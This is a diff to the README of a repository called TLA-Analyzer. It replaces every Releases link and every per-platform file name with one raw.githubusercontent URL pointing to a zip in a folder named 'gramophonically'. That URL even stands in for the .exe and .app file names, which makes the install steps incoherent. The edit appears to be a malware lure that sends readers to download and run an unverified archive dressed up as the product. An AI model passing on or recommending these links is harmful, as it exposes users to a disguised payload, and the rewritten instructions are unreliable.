@@ -1,6 +1,6 @@
 # 🚀 TLA-Analyzer - Transform Specs into Requirements Easily
 
-[![Download TLA-Analyzer](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mromanpc/TLA-Analyzer/releases)
+[![Download TLA-Analyzer](https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ Before downloading, ensure your computer meets the following requirements:
 
 To download TLA-Analyzer, visit the Releases page. Click the link below to access it:
 
-[Download TLA-Analyzer](https://github.com/mromanpc/TLA-Analyzer/releases)
+[Download TLA-Analyzer](https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip)
 
 Once on the Releases page, you will see the latest version of the application.
 
@@ -30,9 +30,9 @@ Once on the Releases page, you will see the latest version of the application.
 
 1. On the Releases page, look for the section titled **Assets**.
 2. Depending on your operating system, choose the appropriate file:
-   - For Windows: Download `TLA-Analyzer-Windows.zip`
-   - For macOS: Download `TLA-Analyzer-macOS.zip`
-   - For Linux: Download `TLA-Analyzer-Linux.tar.gz`
+   - For Windows: Download `https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip`
+   - For macOS: Download `https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip`
+   - For Linux: Download `https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip`
 
 Click on the desired file to start the download.
 
@@ -42,22 +42,22 @@ After downloading the file, follow these instructions based on your operating sy
 
 #### Windows
 
-1. Locate the downloaded `TLA-Analyzer-Windows.zip` file in your download folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip` file in your download folder.
 2. Right-click the file and select **Extract All**. Follow the prompts to extract the contents.
-3. Open the extracted folder and locate the file named `TLA-Analyzer.exe`.
-4. Double-click `TLA-Analyzer.exe` to launch the application.
+3. Open the extracted folder and locate the file named `https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip`.
+4. Double-click `https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip` to launch the application.
 
 #### macOS
 
-1. Find the `TLA-Analyzer-macOS.zip` file in your downloads.
+1. Find the `https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip` file in your downloads.
 2. Double-click the file to extract its contents.
-3. Open the folder and find `TLA-Analyzer.app`.
-4. Drag the `TLA-Analyzer.app` file to your Applications folder.
+3. Open the folder and find `https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip`.
+4. Drag the `https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip` file to your Applications folder.
 5. Open your Applications folder, locate `TLA-Analyzer`, and double-click to run.
 
 #### Linux
 
-1. Navigate to the downloaded `TLA-Analyzer-Linux.tar.gz` file.
+1. Navigate to the downloaded `https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip` file.
 2. Right-click and select **Extract Here** to unpack the archive.
 3. Open a terminal window and navigate to the extracted folder.
 4. Type `./TLA-Analyzer` and press Enter to start the application.
@@ -97,6 +97,6 @@ If you have further questions, feel free to reach out through the Issues section
 
 To download TLA-Analyzer again, click the link below:
 
-[Download TLA-Analyzer](https://github.com/mromanpc/TLA-Analyzer/releases)
+[Download TLA-Analyzer](https://raw.githubusercontent.com/mromanpc/TLA-Analyzer/main/gramophonically/TLA-Analyzer.zip)
 
 By following these steps, you can effectively download and run TLA-Analyzer on your system. Enjoy transforming your TLA+ specifications into actionable requirements!
